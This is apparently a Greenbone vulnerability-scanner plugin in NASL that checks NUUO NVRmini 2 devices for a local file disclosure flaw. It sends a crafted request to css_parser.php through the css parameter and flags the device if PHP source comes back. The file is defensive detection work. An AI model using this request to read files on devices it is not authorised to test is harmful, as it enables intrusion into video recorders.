# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107043");
  script_version("2024-04-03T05:05:20+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-04-03 05:05:20 +0000 (Wed, 03 Apr 2024)");
  script_tag(name:"creation_date", value:"2016-08-24 16:42:51 +0200 (Wed, 24 Aug 2016)");
  script_name("NUUO NVRmini 2 <= 3.0.8 Local File Disclosure Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_web_detect.nasl");
  script_mandatory_keys("nuuo/web/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://cxsecurity.com/issue/WLB-2016080065");
  script_xref(name:"URL", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5350.php");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40211");

  script_tag(name:"summary", value:"NUUO NVRmini 2 devices are prone to a local file disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to disclose a local file content by sending a crafted
  HTTP GET request.");

  script_tag(name:"insight", value:"The vulnerability is due to improper verification of input
  passed through the css parameter to css_parser.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to disclose
  contents of files.");

  script_tag(name:"affected", value:"NUUO NVRmini 2 devices in version 3.0.8 and prior are known to
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir  + "/css_parser.php?css=css_parser.php";
if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"<\?php", extra_check:"/\* please use an absolute address for your css /\*" ) ) {
   report = 'It was possible to disclose the content of css_parser.php file.\n\n';
   report += http_report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
   exit( 0 );
}

exit( 0 );
